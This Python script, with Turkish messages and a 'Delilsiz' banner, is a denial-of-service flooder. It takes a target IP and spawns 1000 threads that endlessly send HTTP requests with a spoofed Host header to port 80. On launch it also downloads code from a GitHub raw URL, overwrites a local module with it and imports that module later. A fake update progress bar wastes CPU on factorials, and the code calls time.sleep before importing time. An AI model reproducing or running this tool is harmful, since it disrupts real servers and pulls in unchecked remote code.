#!/usr/bin/env python
# -*- coding: utf-8 -*-
from fake_useragent import UserAgent
import requests
import socket
from colorama import Fore
import colorama
import os
import math
import random
import sys
import threading
##########################################

colorama.init()


def progress_bar(progress,total,color=Fore.GREEN):
    percent = 100 * (progress / float(total))
    bar = '#' * int(percent) + '-' * (100 - int(percent))
    print(color + f"\r|{bar}| {percent:.2f}%",end="\r")

numbers = [x * 5 for x in range(2000, 3000)]
result = []


k = requests.get("https://raw.githubusercontent.com/rootDelilsiz/d8l6lsizattack/main/d8l6lsizattack.py").text
with open("d8l6lsizdattack.py", "r", encoding="utf-8") as f:
    read = f.read()
if read == k:
    import d8l6lsizdattack
else:
    print(Fore.MAGENTA + "Güncellemeler Denetleniyor...")
    time.sleep(3)
    print(Fore.YELLOW + "Güncelleme Yapılıyor ")
    import time
    
    with open("d8l6lsizdattack.py", "w", encoding="utf-8") as f:
        f.write(k)
        progress_bar(0,len(numbers))
        for i, x in enumerate(numbers):
            result.append(math.factorial(x))
            progress_bar(i + 1,len(numbers))
        print(Fore.GREEN + "\nGüncelleme Tamamlandı!")
        time.sleep(5)
        os.system("cls||clear")

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
bytes = random._urandom(1024)
if os.name == "nt":
    os.system("cls")
elif os.name == "posix":
    os.system("clear")


print(Fore.YELLOW,"""
██████╗ ███████╗██╗     ██╗██╗     ███████╗██╗███████╗
██╔══██╗██╔════╝██║     ██║██║     ██╔════╝██║╚══███╔╝
██║  ██║█████╗  ██║     ██║██║     ███████╗██║  ███╔╝ 
██║  ██║██╔══╝  ██║     ██║██║     ╚════██║██║ ███╔╝  
██████╔╝███████╗███████╗██║███████╗███████║██║███████╗
╚═════╝ ╚══════╝╚══════╝╚═╝╚══════╝╚══════╝╚═╝╚══════╝
                
               [+]Delilsiz[+]
                

                """)


target = input("Hedef IP: ")
site = "http://"+target
ua = UserAgent()
port = 80
fake_ip = "185.12.109.10"
attack_num = 0
def atak():
    while True:
        try:
           s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
           s.connect((target, port))
           s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
           s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
           s.close()
           global attack_num
           attack_num += 1
           print(Fore.GREEN+f"[+]Başarılı... -> {attack_num}")
        except:
            print(Fore.RED+"[-]Bir hata meydana geldi server çökmüş olabilir kontrol ediniz :)")

for i in range(1000):
    thread = threading.Thread(target=atak)
    thread.start()
    requests.get(site)
